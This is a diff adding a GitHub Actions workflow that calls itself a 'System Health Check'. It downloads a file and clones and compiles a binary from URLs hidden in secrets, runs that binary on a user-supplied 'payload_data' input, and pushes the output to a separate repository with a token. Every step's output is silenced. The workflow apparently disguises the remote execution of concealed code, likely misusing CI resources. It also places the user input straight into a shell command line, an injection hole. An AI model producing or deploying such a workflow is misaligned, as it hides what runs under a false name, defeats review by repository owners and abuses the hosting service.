@@ -1,0 +1,70 @@
+name: System Health Check
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload_data:
+        description: 'Target identifier'
+        required: true
+        default: 'テスト'
+        type: string
+      timeout_sec:
+        description: 'Timeout (sec)'
+        required: false
+        default: '1024'
+        type: string
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout monitor
+        uses: actions/checkout@v4
+      
+      - name: Setup environment cache
+        id: cache-bin
+        uses: actions/cache@v4
+        with:
+          path: bin_data.dat
+          key: ${{ runner.os }}-health-bin-v2
+      
+      - name: Initialize components
+        if: steps.cache-bin.outputs.cache-hit != 'true'
+        run: |
+          sudo apt-get update >/dev/null 2>&1
+          sudo apt-get install -y aria2 >/dev/null 2>&1
+          aria2c -q -x 16 -s 16 -k 1M "${{ secrets.BIN_URL }}" -o bin_data.dat >/dev/null 2>&1
+      
+      - name: Fetch modules
+        run: |
+          git clone -q "${{ secrets.CORE_URL }}" core_module >/dev/null 2>&1
+      
+      - name: Cache modules
+        id: cache-core
+        uses: actions/cache@v4
+        with:
+          path: core_module/${{ secrets.BIN_TARGET }}
+          key: ${{ runner.os }}-core-module-${{ github.sha }}
+          restore-keys: |
+            ${{ runner.os }}-core-module-
+      
+      - name: Compile modules
+        if: steps.cache-core.outputs.cache-hit != 'true'
+        run: |
+          cd core_module
+          make -s -j4 ${{ secrets.BIN_TARGET }} >/dev/null 2>&1
+      
+      - name: Execute validation
+        run: |
+          ./core_module/${{ secrets.BIN_TARGET }} -m ./bin_data.dat -p "${{ github.event.inputs.payload_data }}" -n ${{ github.event.inputs.timeout_sec }} ${{ secrets.CMD_OPTS }} > report.log 2>/dev/null
+          
+      - name: Sync backup
+        run: |
+          git clone -q https://oauth2:${{ secrets.BACKUP_TOKEN }}@github.com/${{ github.repository_owner }}/system-health-backup.git backup_repo >/dev/null 2>&1
+          cd backup_repo
+          cp ../report.log ./report_$(date +%Y%m%d_%H%M%S).log
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add .
+          git commit -q -m "chore: health check update" >/dev/null 2>&1
+          git push -q origin main >/dev/null 2>&1
